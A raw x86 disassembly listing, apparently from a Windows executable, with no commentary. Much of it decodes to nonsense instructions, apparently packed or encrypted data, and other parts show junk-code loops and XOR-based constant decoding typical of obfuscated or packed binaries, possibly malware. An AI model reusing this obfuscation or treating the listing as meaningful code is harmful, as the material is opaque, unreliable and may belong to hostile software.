  406113:	adc    BYTE PTR [ecx],0x9b
  406116:	jmp    0x63e135b6
  40611b:	add    eax,0xc60f671e
  406120:	gs push edi
  406122:	int    0xd0
  406124:	xor    eax,DWORD PTR [edi+0x6184314f]
  40612a:	aas    
  40612b:	and    BYTE PTR [edi],ch
  40612d:	or     eax,0x6c31fa18
  406132:	clc    
  406133:	test   al,0x7e
  406135:	leave  
  406136:	fcom   QWORD PTR [ebp-0x5bddf264]
  40613c:	mov    ebx,DWORD PTR [eax-0x5e]
  40613f:	jbe    0x406166
  406141:	fstp   QWORD PTR [ebx+esi*4+0x6d]
  406145:	mov    al,0xfb
  406147:	sar    DWORD PTR [esp+edx*1-0x173dba73],0x8b
  40614f:	jge    0x4061ac
  406151:	lods   eax,DWORD PTR ds:[esi]
  406152:	mov    dh,BYTE PTR [edi+0x75]
  406155:	sub    esi,DWORD PTR [edi]
  406157:	popf   
  406158:	jne    0x406142
  40615a:	in     al,dx
  40615b:	cmc    
  40615c:	lock rcl DWORD PTR es:[edx],cl
  406160:	test   al,0x1e
  406162:	shl    BYTE PTR [esi+0xf779240],cl
  406168:	inc    ebx
  406169:	ret    0xf3e2
  40616c:	adc    eax,0x251ddcd3
  406171:	pop    ds
  406172:	xchg   esi,eax
  406173:	push   edi
  406174:	ins    DWORD PTR es:[edi],dx
  406175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406176:	test   eax,0xe917afdb
  40617b:	aad    0x38
  40617d:	sbb    al,0x98
  40617f:	add    eax,0x92624592
  406184:	sbb    esp,DWORD PTR [ebp-0x3fa6c415]
  40618a:	aad    0x22
  40618c:	pop    ebx
  40618d:	add    edx,edi
  40618f:	sbb    eax,0xa1449f62
  406194:	mov    ds:0x35457a8,al
  406199:	xor    DWORD PTR [eax+0x2d],ebx
  40619c:	daa    
  40619d:	and    al,0xa8
  40619f:	enter  0x59a6,0x12
  4061a3:	call   0xa25b2f7a
  4061a8:	shl    BYTE PTR [edx],cl
  4061aa:	add    al,0x99
  4061ac:	lea    edi,[ecx]
  4061ae:	add    BYTE PTR [edx],cl
  4061b0:	xor    BYTE PTR [ebx-0x6f453ef],0xfb
  4061b7:	mov    cl,0xad
  4061b9:	enter  0x37f6,0x4b
  4061bd:	cwde   
  4061be:	xor    al,0xaf
  4061c0:	mov    ecx,eax
  4061c2:	jo     0x4061da
  4061c4:	in     eax,0x75
  4061c6:	and    BYTE PTR [edx],dh
  4061c8:	fxch   st(1)
  4061ca:	sub    DWORD PTR [edx+0x5260d218],0xffffffb9
  4061d1:	jne    0x40620e
  4061d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061d4:	ss jb  0x406181
  4061d7:	or     al,0x40
  4061d9:	xchg   BYTE PTR [edi+0x3e],dl
  4061dc:	je     0x4061da
  4061de:	scas   eax,DWORD PTR es:[edi]
  4061df:	and    bh,al
  4061e1:	je     0x4061a1
  4061e3:	push   esi
  4061e4:	cwde   
  4061e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061e6:	mov    BYTE PTR [edx],bl
  4061e8:	test   eax,0xf3006e4a
  4061ed:	das    
  4061ee:	ins    BYTE PTR es:[edi],dx
  4061ef:	loop   0x4061ec
  4061f1:	nop
  4061f2:	aam    0x2e
  4061f4:	jnp    0x406258
  4061f6:	sub    esp,DWORD PTR [ebp-0x68]
  4061f9:	int    0xeb
  4061fb:	lock arpl WORD PTR [edx],bx
  4061fe:	mov    ecx,0x149de9bb
  406203:	jno    0x40625c
  406205:	outs   dx,DWORD PTR ss:[esi]
  406207:	sub    al,0x7a
  406209:	add    DWORD PTR [ebx],edi
  40620b:	sar    BYTE PTR [ecx+0x77],1
  40620e:	mov    dl,0xfd
  406210:	dec    ebp
  406211:	xchg   ebx,eax
  406212:	dec    edi
  406213:	or     DWORD PTR [esi],esp
  406215:	mov    ah,0xe2
  406217:	fstp   QWORD PTR [ebx-0x36]
  40621a:	mov    al,0x44
  40621c:	(bad)  
  40621d:	je     0x40622b
  40621f:	xlat   BYTE PTR ds:[ebx]
  406220:	and    BYTE PTR [ebx-0x3fd907a],al
  406226:	adc    BYTE PTR [esi],cl
  406228:	or     al,0xc7
  40622a:	test   DWORD PTR [eax],edi
  40622c:	inc    ebx
  40622e:	test   BYTE PTR [edi],0xb5
  406231:	out    dx,eax
  406232:	sbb    BYTE PTR [esi],ch
  406234:	jne    0x406222
  406236:	icebp  
  406237:	or     DWORD PTR [ebx-0x13],esi
  40623a:	aam    0xbb
  40623c:	call   0x29cf:0x5532c55
  406243:	aaa    
  406244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406245:	mov    edi,0x609238d8
  40624a:	pop    edx
  40624b:	ins    BYTE PTR es:[edi],dx
  40624c:	fbld   TBYTE PTR [ebx]
  40624e:	mov    esi,0x204ee1fa
  406253:	push   ds
  406254:	xor    al,0x53
  406256:	or     DWORD PTR [ecx-0xd603a5e],edi
  40625c:	jmp    0x9c0fb82b
  406261:	sub    DWORD PTR [ecx+0x8],0x33
  406265:	lock and DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	adc    BYTE PTR [eax+0x3f5464b6],dl
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	pop    ebx
  40631e:	fsubr  st,st(2)
  406320:	cmp    ebx,DWORD PTR [edx-0x61ff21e2]
  406326:	pop    esi
  406327:	add    DWORD PTR [ebx+0x12],0x65
  40632b:	mul    DWORD PTR [edi+0x7d79e3d4]
  406331:	pushf  
  406332:	jo     0x4062de
  406334:	retf   0x639e
  406337:	sbb    DWORD PTR [edi],ebx
  406339:	xchg   edx,eax
  40633a:	pop    edi
  40633b:	push   ss
  40633c:	cmc    
  40633d:	mov    eax,ds:0x2d90bc86
  406342:	gs mov cl,0x9e
  406345:	mov    gs,WORD PTR [eax-0x7f1c416a]
  40634b:	xor    al,0xcc
  40634d:	adc    ecx,edx
  40634f:	iret   
  406350:	sbb    edx,edx
  406352:	call   0xd0f2:0xde2d9878
  406359:	push   ds
  40635a:	mov    edi,edi
  40635c:	sbb    al,0xbc
  40635e:	push   ebx
  40635f:	inc    edi
  406360:	push   esi
  406361:	hlt    
  406362:	aam    0x1c
  406364:	mov    dh,cl
  406366:	fld    DWORD PTR [edi]
  406368:	add    eax,0x58fd38c4
  40636d:	lods   eax,DWORD PTR ds:[esi]
  40636e:	sub    eax,0xb79ed062
  406373:	out    0xa2,eax
  406375:	fsubp  st(7),st
  406377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406378:	(bad)  
  406379:	int3   
  40637a:	iret   
  40637b:	popf   
  40637c:	(bad)  
  40637d:	data16 jbe 0x4063e5
  406380:	mov    dl,0x7a
  406382:	push   esi
  406383:	jge    0x40630d
  406385:	add    ebp,DWORD PTR [edi+0x11c81931]
  40638b:	and    BYTE PTR [ecx-0x54813e40],0xb6
  406392:	xor    eax,DWORD PTR [ebp+0x5c0a8473]
  406398:	pop    ebp
  406399:	in     eax,dx
  40639a:	shl    BYTE PTR [ebx+0x16],cl
  40639d:	and    ecx,DWORD PTR [ebp+0x43]
  4063a0:	jg     0x4063cb
  4063a2:	out    0x24,al
  4063a4:	sbb    al,BYTE PTR [eax+0x61]
  4063a7:	fwait
  4063a8:	mov    ecx,0x5cbc277a
  4063ad:	pop    eax
  4063ae:	push   ss
  4063af:	(bad)  [edi]
  4063b1:	pop    esp
  4063b2:	push   ebx
  4063b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b4:	mov    eax,0xda6109db
  4063b9:	ret    0x9fff
  4063bc:	cmp    BYTE PTR [ebp+0x29],0xca
  4063c0:	icebp  
  4063c1:	mov    al,ds:0x9b5ce428
  4063c6:	(bad)  
  4063c7:	frstor [eax]
  4063c9:	jne    0x4063eb
  4063cb:	test   eax,0x3d59dfb
  4063d0:	sbb    DWORD PTR [ebp-0x58],0x1756e7a8
  4063d7:	cs jp  0x406422
  4063da:	cld    
  4063db:	mov    ecx,0x2625ebd9
  4063e0:	xor    DWORD PTR [ecx-0x3b8f474c],0x61174c69
  4063ea:	sbb    bh,bl
  4063ec:	mov    ebp,0x13c59325
  4063f1:	mov    esp,0xbe4c352a
  4063f6:	adc    al,0xde
  4063f8:	or     bl,BYTE PTR [edi+0x62]
  4063fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063fc:	test   al,0x54
  4063fe:	inc    ecx
  4063ff:	sahf   
  406400:	pop    ebp
  406401:	inc    ecx
  406402:	push   eax
  406403:	cld    
  406404:	mov    bh,0x7c
  406406:	aaa    
  406407:	icebp  
  406408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406409:	xchg   DWORD PTR [ebx-0x75],eax
  40640c:	push   ebp
  40640d:	js     0x40645f
  40640f:	dec    edx
  406410:	daa    
  406411:	push   esp
  406412:	jg     0x406467
  406414:	push   ebx
  406415:	add    eax,0xf5c3cac4
  40641a:	mov    bh,0xb8
  40641c:	and    al,0xa7
  40641e:	xor    BYTE PTR [ebp-0x73],bh
  406421:	or     bl,BYTE PTR [edi+0x76]
  406424:	jnp    0x406450
  406426:	test   DWORD PTR [edi],edi
  406428:	inc    ecx
  406429:	pop    edx
  40642a:	xor    eax,0x4e98276f
  40642f:	jne    0x406497
  406431:	out    0x68,al
  406433:	ret    0x2c08
  406436:	cld    
  406437:	mov    dl,0xfc
  406439:	push   eax
  40643a:	mov    bh,0x4f
  40643c:	nop
  40643d:	xchg   edx,eax
  40643e:	fdivr  DWORD PTR [ebx+0x62fc7107]
  406444:	(bad)  
  406445:	out    0xe6,eax
  406447:	test   al,al
  406449:	lock mov edx,0xd4eb16b3
  40644f:	jle    0x4063d7
  406451:	ss xchg ebp,eax
  406453:	test   al,0x5e
  406455:	push   edi
  406456:	pop    ebx
  406457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406458:	sub    DWORD PTR [ecx+esi*4],eax
  40645b:	inc    esi
  40645c:	mov    bh,0x97
  40645e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40645f:	jb     0x40644a
  406461:	fadd   st(3),st
  406463:	dec    ebx
  406464:	mov    ss,WORD PTR gs:[eax-0x2472bc6e]
  40646b:	ss jnp 0x4064de
  40646e:	mov    bh,0xb0
  406470:	sub    al,0x1c
  406472:	test   eax,0x8857be7
  406477:	(bad)  
  406478:	adc    al,0xa7
  40647a:	mov    esi,0x2758764e
  40647f:	stc    
  406480:	scas   al,BYTE PTR es:[edi]
  406481:	xor    eax,DWORD PTR [ecx-0x13]
  406484:	push   ebp
  406485:	iret   
  406486:	push   ebp
  406487:	xchg   edx,eax
  406488:	loopne 0x406451
  40648a:	adc    bh,BYTE PTR [ebp+0x12]
  40648d:	outs   dx,DWORD PTR es:[esi]
  40648f:	and    BYTE PTR [edi],al
  406491:	pop    ebx
  406492:	fcomi  st,st(0)
  406494:	in     al,0xc7
  406496:	fnstenv gs:[eax-0x56]
  40649a:	add    ebx,DWORD PTR [esi+0x1823abf1]
  4064a0:	adc    dh,ah
  4064a2:	sbb    eax,0x6f902ff0
  4064a7:	imul   eax,ebp,0x7b
  4064aa:	mov    ecx,0xf24e5161
  4064af:	retf   
  4064b0:	mov    edx,0x9738cfcd
  4064b5:	jmp    0x406489
  4064b7:	fmulp  st(5),st
  4064b9:	mov    eax,ds:0x5fb17da4
  4064be:	scas   al,BYTE PTR es:[edi]
  4064bf:	dec    esi
  4064c0:	inc    ebp
  4064c1:	jp     0x4064cc
  4064c3:	inc    ecx
  4064c4:	pop    edi
  4064c5:	sbb    dh,BYTE PTR fs:0x94074283
  4064cc:	mov    eax,0x789ea6e4
  4064d1:	push   edi
  4064d2:	pcmpeqb mm1,QWORD PTR [ecx-0x491ddd39]
  4064d9:	inc    esi
  4064da:	dec    esp
  4064db:	fcomp  DWORD PTR [ecx-0xe14d75d]
  4064e2:	add    ebx,DWORD PTR [ebx+0x7f]
  4064e5:	push   ebp
  4064e6:	push   es
  4064e7:	sub    esi,eax
  4064e9:	cmp    BYTE PTR [ebx-0x7ec9ebcc],bh
  4064ef:	xlat   BYTE PTR ds:[ebx]
  4064f0:	or     DWORD PTR [ebx+0x55b2d1c8],edx
  4064f6:	popa   
  4064f7:	or     dh,BYTE PTR [esi-0x5b]
  4064fa:	out    dx,eax
  4064fb:	sub    cl,dh
  4064fd:	sbb    al,0x8a
  4064ff:	mov    ds:0xb3348332,al
  406504:	cli    
  406505:	mov    eax,0x7da3072d
  40650a:	sti    
  40650b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650c:	jmp    0xe9f60151
  406511:	add    al,0xc2
  406513:	je     0x406552
  406515:	test   BYTE PTR [edi-0x5b0030a9],al
  40651b:	dec    edx
  40651c:	xor    eax,0xd3b3846
  406521:	sub    esi,0x9fb155b9
  406527:	jnp    0x40651d
  406529:	mov    esp,0x1fc549a6
  40652e:	pop    ebx
  40652f:	repz xchg edx,eax
  406531:	mov    bl,0x74
  406533:	int    0xa7
  406535:	mov    eax,0xcb1f7010
  40653a:	dec    ecx
  40653b:	outs   dx,BYTE PTR ds:[esi]
  40653c:	pop    ebx
  40653d:	mov    es,esp
  40653f:	jo     0x4064c1
  406541:	jg     0x4064e8
  406543:	aas    
  406544:	(bad)  
  406545:	rol    edi,cl
  406547:	scas   al,BYTE PTR es:[edi]
  406548:	(bad)  
  406549:	jecxz  0x4064d8
  40654b:	arpl   WORD PTR [edx+0xd],di
  40654e:	inc    ebp
  40654f:	(bad)  
  406550:	xor    edx,DWORD PTR [esp+esi*8-0x7afbf4dd]
  406557:	stos   DWORD PTR es:[edi],eax
  406558:	pop    ds
  406559:	stc    
  40655a:	aam    0x7
  40655c:	icebp  
  40655d:	cmp    BYTE PTR [ebp-0x53],ah
  406560:	add    BYTE PTR [eax+0xc77010e],bh
  406566:	xchg   BYTE PTR [eax+ebx*1],bl
  406569:	cli    
  40656a:	xchg   ebp,eax
  40656b:	mov    edx,ss
  40656d:	xchg   esi,eax
  40656e:	push   cs
  40656f:	or     eax,DWORD PTR [ebp-0xa7ffc4e]
  406575:	inc    ecx
  406576:	xor    al,0xba
  406578:	inc    esp
  406579:	mov    esi,0xd9d95d5e
  40657e:	jns    0x406587
  406580:	sub    DWORD PTR [eax+0xaedccbd],ebp
  406586:	out    0xb6,eax
  406588:	(bad)  
  406589:	bound  ecx,QWORD PTR [esi]
  40658b:	xor    DWORD PTR [ecx-0xb],esp
  40658e:	jecxz  0x406556
  406590:	jmp    0xc7eb4859
  406595:	mov    eax,ds:0xc079cac9
  40659a:	adc    al,0x82
  40659c:	push   eax
  40659d:	fnstsw WORD PTR [edx+0x35]
  4065a0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4065a2:	mov    esp,0xa8742333
  4065a7:	pop    esp
  4065a8:	lahf   
  4065a9:	loope  0x406563
  4065ab:	or     ecx,DWORD PTR [ecx+0x6ef64f0]
  4065b1:	and    BYTE PTR [ebx+0x72],ah
  4065b4:	xlat   BYTE PTR ds:[ebx]
  4065b5:	data16 mov bl,0xc0
  4065b8:	popa   
  4065b9:	cwde   
  4065ba:	popf   
  4065bb:	mov    bh,0x81
  4065bd:	in     eax,dx
  4065be:	leave  
  4065bf:	fidiv  DWORD PTR ds:0x74c1c427
  4065c5:	sub    DWORD PTR [ebp-0x17a2dc87],ebx
  4065cb:	xlat   BYTE PTR ds:[ebx]
  4065cc:	xchg   ebp,eax
  4065cd:	mov    ?,WORD PTR [edx]
  4065cf:	test   BYTE PTR [ebx+0x3da87984],0x6
  4065d6:	or     edx,eax
  4065d8:	(bad)  
  4065d9:	(bad)  
  4065db:	and    cl,ah
  4065dd:	xchg   ah,cl
  4065df:	mov    eax,0x32949c47
  4065e4:	out    0x63,al
  4065e6:	ret    
  4065e7:	nop
  4065e8:	sbb    BYTE PTR [edx],cl
  4065ea:	imul   DWORD PTR [edx+edi*2+0x4df3f634]
  4065f1:	repz adc BYTE PTR [esi-0x78b94f35],ch
  4065f8:	push   0x68
  4065fa:	retf   0x7394
  4065fd:	test   al,0x48
  4065ff:	pop    edx
  406600:	(bad)  
  406601:	out    dx,al
  406602:	aas    
  406603:	jnp    0x4065b1
  406605:	mov    dl,0x23
  406607:	add    DWORD PTR [ebp-0x5e],edx
  40660a:	xchg   cl,dh
  40660c:	xor    BYTE PTR [ebp+0x52],0x82
  406610:	stos   BYTE PTR es:[edi],al
  406611:	xor    DWORD PTR [ebp+0x2f],0xa100e346
  406618:	inc    esp
  406619:	jl     0x4065fa
  40661b:	mov    cl,0x33
  40661d:	xchg   ebp,eax
  40661e:	in     eax,dx
  40661f:	out    dx,al
  406620:	push   ss
  406621:	shl    DWORD PTR [ebp+0x8],1
  406624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406625:	jle    0x4065c9
  406627:	sbb    cl,ch
  406629:	cmp    eax,ebp
  40662b:	ret    
  40662c:	repz in al,dx
  40662e:	cmp    al,al
  406630:	adc    bh,BYTE PTR [ebp-0x56]
  406633:	pop    eax
  406634:	shr    BYTE PTR [edi+0x7],1
  406637:	adc    ah,BYTE PTR [ebp-0x2841ee42]
  40663d:	cli    
  40663e:	je     0x4065ec
  406640:	xor    bl,BYTE PTR [edx+0x1c8df600]
  406646:	add    DWORD PTR [ebx-0x4bd35038],0xfffffffe
  40664d:	icebp  
  40664e:	loop   0x40664f
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
